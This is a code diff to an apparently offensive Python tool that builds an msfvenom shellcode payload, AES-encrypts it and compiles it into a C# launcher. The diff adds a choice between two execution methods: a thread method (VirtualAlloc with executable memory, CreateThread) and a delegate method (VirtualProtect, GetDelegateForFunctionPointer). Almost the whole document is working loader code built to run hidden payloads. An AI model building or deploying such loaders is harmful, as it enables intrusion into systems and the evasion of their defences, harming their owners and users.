@@ -13,6 +13,7 @@ def main():
 	filename = args.filename
 	arch = args.arch
 	base64only = args.base64only
+	method = args.method
 
 	''' generate msfvenom payload '''
 	print("[+] Generating MSFVENOM payload...")
@@ -38,10 +39,18 @@ def main():
 		return
 
 	''' change template '''
-	print("[+] Generating launcher.cs file...")
+	print("[+] Generating launcher.cs file, method=" + method + "...")
 	template = get_decryptor_template()
 	template = template.replace('~BASE64~', b64.decode('utf-8'))
 	template =  template.replace('~KEY~', key)
+
+	''' include required code based on method '''
+	if(method == "delegate"):
+		template = template.replace("/* DELEGATE", "")
+		template = template.replace("DELEGATE */", "")
+	else:
+		template = template.replace("/* THREAD", "")
+		template = template.replace("THREAD */", "")
 
 	'''save template to .cs file'''
 	f = open("./launcher.cs", "w")
@@ -50,7 +59,10 @@ def main():
 
 	'''compile file'''
 	print("[+] Compiling the launcher...")
-	os.system("mcs /platform:" + arch + " ./launcher.cs /out:./" + filename  + ">/dev/null");
+	if(method == "delegate"):
+		os.system("mcs /platform:" + arch + " /unsafe ./launcher.cs /out:./" + filename  + ">/dev/null");
+	else:
+		os.system("mcs /platform:" + arch + " ./launcher.cs /out:./" + filename  + ">/dev/null");
 
 	print("[+] Launcher compiled and written to ./" + filename)
 	print("[+] Have a nice day!")
@@ -100,6 +112,8 @@ def parse_args():
 		help="The target architecture (x64 or x86) for Mono.")
 	parser.add_argument("-b", "--base64only", action="store_true",
 		help="Output the base64 encrypted payload only.")
+	parser.add_argument("-m", "--method", default="thread", type=str,
+		help="The method to use: thread/delegate.")
 
 
 	return parser.parse_args()
@@ -117,6 +131,11 @@ namespace Launcher
     static class Program
     {
 
+/* DELEGATE
+				[DllImport("kernel32.dll")]
+        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+DELEGATE */
+/* THREAD
 #region "Win32 InteropServices definitions"
 
         [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -140,11 +159,15 @@ namespace Launcher
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern UInt32 WaitForSingleObject(
-            IntPtr hHandle, 
+            IntPtr hHandle,
             UInt32 dwMilliseconds
         );
 
 #endregion
+THREAD */
+/* DELEGATE
+				delegate void PrototypeFunc();
+DELEGATE */
 
         static void Main()
         {
@@ -159,14 +182,28 @@ namespace Launcher
 
         public static void RunShellcode(byte[] shellcode)
         {
-            // 0x1000 = MEM_COMMIT
-            // 0x40 = PAGE_EXECUTE_READWRITE
+/* THREAD
             IntPtr buffer = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
             Marshal.Copy(shellcode, 0, (IntPtr)(buffer), shellcode.Length);
             IntPtr thread = IntPtr.Zero;
             UInt32 threadId = 0;
             thread = CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, ref threadId);
             WaitForSingleObject(thread, 0xFFFFFFFF);
+THREAD */
+/* DELEGATE
+						unsafe
+            {
+                fixed(byte* ptr = shellcode)
+                {
+                    IntPtr memAddr = (IntPtr)ptr;
+
+                    VirtualProtect(memAddr, (UIntPtr)shellcode.Length, (uint)0x40, out uint lpflOldProtect);
+
+                    PrototypeFunc func = (PrototypeFunc)Marshal.GetDelegateForFunctionPointer(memAddr, typeof(PrototypeFunc));
+                    func();
+                }
+            }
+DELEGATE */
         }
 
         static byte[] Decrypt(string key, string aes_base64)
